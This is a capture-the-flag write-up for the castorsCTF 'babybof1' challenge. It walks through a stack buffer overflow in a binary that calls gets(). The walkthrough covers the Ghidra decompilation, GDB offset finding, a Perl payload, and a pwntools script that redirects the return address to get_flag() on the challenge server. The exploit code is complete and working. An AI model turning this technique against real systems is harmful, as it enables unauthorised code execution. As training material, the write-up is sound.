# babybof1

## Description

Author: Lunga

```  
nc chals20.cybercastors.com 14425  
```

## Analysis

Open the binary with Ghidra and look at `main()`

```c  
void main(void)

{  
 char local_108 [256];  
  
 puts("Welcome to the cybercastors Babybof");  
 printf("Say your name: ");  
 gets(local_108);  
 return;  
}  
```

It's a buffer overflow, we just have to write more than 256 chars. We need to
call this handy `get_flag()` function:

```c  
void get_flag(void)

{  
 int iVar1;  
 FILE *__stream;  
  
 __stream = fopen("flag.txt","r");  
 if (__stream == (FILE *)0x0) {  
                   /* WARNING: Subroutine does not return */  
   exit(1);  
 }  
 while( true ) {  
   iVar1 = fgetc(__stream);  
   if ((char)iVar1 == -1) break;  
   putchar((int)(char)iVar1);  
 }  
 fclose(__stream);  
                   /* WARNING: Subroutine does not return */  
 exit(0);  
}  
```

Here is the disassembly for both functions:

```  
(gdb) disas main  
Dump of assembler code for function main:  
  0x000000000040074d <+0>:      push   %rbp  
  0x000000000040074e <+1>:      mov    %rsp,%rbp  
  0x0000000000400751 <+4>:      sub    $0x100,%rsp  
  0x0000000000400758 <+11>:     lea    0xc9(%rip),%rdi        # 0x400828  
  0x000000000040075f <+18>:     callq  0x400590 <puts@plt>  
  0x0000000000400764 <+23>:     lea    0xe1(%rip),%rdi        # 0x40084c  
  0x000000000040076b <+30>:     mov    $0x0,%eax  
  0x0000000000400770 <+35>:     callq  0x4005b0 <printf@plt>  
  0x0000000000400775 <+40>:     lea    -0x100(%rbp),%rax  
  0x000000000040077c <+47>:     mov    %rax,%rdi  
  0x000000000040077f <+50>:     mov    $0x0,%eax  
  0x0000000000400784 <+55>:     callq  0x4005d0 <gets@plt>  
  0x0000000000400789 <+60>:     nop  
  0x000000000040078a <+61>:     leaveq  
  0x000000000040078b <+62>:     retq  
End of assembler dump.  
(gdb) disas get_flag  
Dump of assembler code for function get_flag:  
  0x00000000004006e7 <+0>:      push   %rbp  
  0x00000000004006e8 <+1>:      mov    %rsp,%rbp  
  0x00000000004006eb <+4>:      sub    $0x10,%rsp  
  0x00000000004006ef <+8>:      lea    0x122(%rip),%rsi        # 0x400818  
  0x00000000004006f6 <+15>:     lea    0x11d(%rip),%rdi        # 0x40081a  
  0x00000000004006fd <+22>:     callq  0x4005e0 <fopen@plt>  
  0x0000000000400702 <+27>:     mov    %rax,-0x8(%rbp)  
  0x0000000000400706 <+31>:     cmpq   $0x0,-0x8(%rbp)  
  0x000000000040070b <+36>:     jne    0x400722 <get_flag+59>  
  0x000000000040070d <+38>:     mov    $0x1,%edi  
  0x0000000000400712 <+43>:     callq  0x4005f0 <exit@plt>  
  0x0000000000400717 <+48>:     movsbl -0x9(%rbp),%eax  
  0x000000000040071b <+52>:     mov    %eax,%edi  
  0x000000000040071d <+54>:     callq  0x400580 <putchar@plt>  
  0x0000000000400722 <+59>:     mov    -0x8(%rbp),%rax  
  0x0000000000400726 <+63>:     mov    %rax,%rdi  
  0x0000000000400729 <+66>:     callq  0x4005c0 <fgetc@plt>  
  0x000000000040072e <+71>:     mov    %al,-0x9(%rbp)  
  0x0000000000400731 <+74>:     cmpb   $0xff,-0x9(%rbp)  
  0x0000000000400735 <+78>:     jne    0x400717 <get_flag+48>  
  0x0000000000400737 <+80>:     mov    -0x8(%rbp),%rax  
  0x000000000040073b <+84>:     mov    %rax,%rdi  
  0x000000000040073e <+87>:     callq  0x4005a0 <fclose@plt>  
  0x0000000000400743 <+92>:     mov    $0x0,%edi  
  0x0000000000400748 <+97>:     callq  0x4005f0 <exit@plt>  
End of assembler dump.  
(gdb) break *0x0000000000400789  
Breakpoint 1 at 0x400789  
(gdb) break *0x00000000004006e7  
Breakpoint 2 at 0x4006e7  
```

Create a rough overflow to see where the end of the input ends up:

```  
root@kali:~/Downloads# perl -e 'print "A"x268' > payload  
```

```  
(gdb) run < payload  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /root/Downloads/babybof < payload  
Welcome to the cybercastors Babybof

Breakpoint 1, 0x0000000000400789 in main ()  
(gdb) x/40wx $rsp+200  
0x7fffffffe188: 0x41414141      0x41414141      0x41414141      0x41414141  
0x7fffffffe198: 0x41414141      0x41414141      0x41414141      0x41414141  
0x7fffffffe1a8: 0x41414141      0x41414141      0x41414141      0x41414141  
0x7fffffffe1b8: 0x41414141      0x41414141      0x41414141      0x41414141  
0x7fffffffe1c8: 0x41414141      0x00007f00      0x00000000      0x00000000  
0x7fffffffe1d8: 0xffffe2a8      0x00007fff      0x00040000      0x00000001  
0x7fffffffe1e8: 0x0040074d      0x00000000      0x00000000      0x00000000  
0x7fffffffe1f8: 0x7717f981      0x5ae6ba70      0x00400600      0x00000000  
0x7fffffffe208: 0xffffe2a0      0x00007fff      0x00000000      0x00000000  
0x7fffffffe218: 0x00000000      0x00000000      0xbb97f981      0xa519450f  
(gdb) cont  
Continuing.

Program received signal SIGSEGV, Segmentation fault.  
0x00007f0041414141 in ?? ()  
(gdb)  
```

Perfect, that ended up right in the middle of the return address. We need to
overwrite the return address with the address of `get_flag()`
(0x00000000004006e7). So that will be 264 chars, plus the address of
`get_flag()`.

```  
root@kali:~/Downloads# perl -e 'print "A"x264 .
"\xe7\x06\x40\x00\x00\x00\x00\x00"' > payload && ./babybof < payload; echo $?  
Welcome to the cybercastors Babybof  
Say your name: 1  
```

It's returning 1 because there is no `flag.txt` to open. Create one, and the
contents is printed out.

```  
root@kali:~/Downloads# echo hello > flag.txt  
root@kali:~/Downloads# perl -e 'print "A"x264 .
"\xe7\x06\x40\x00\x00\x00\x00\x00"' > payload && ./babybof < payload; echo $?  
Welcome to the cybercastors Babybof  
Say your name: hello  
0  
```

## Solution

Now that we have a POC working locally, code up the exploit for the remote
server.

```python  
#!/usr/bin/env python3  
from pwn import *

binary = ELF('./babybof')  
get_flag = binary.symbols['get_flag']  
print("get_flag: %x\n" % get_flag)  
p = remote('chals20.cybercastors.com', 14425)  
p.recvuntil('Say your name:')  
payload = b'A' * 264  
payload += p64(get_flag)  
p.sendline(payload)  
p.stream()  
```

```  
root@kali:~/Downloads# ./exploit.py  
[*] '/root/Downloads/babybof'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
get_flag: 4006e7

[+] Opening connection to chals20.cybercastors.com on port 14425: Done  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe7^F@^@^@^@^@^@  
castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}  
```

Original writeup
(https://github.com/dobsonj/ctf/tree/master/writeups/2020/castorsctf/babybof1#babybof1).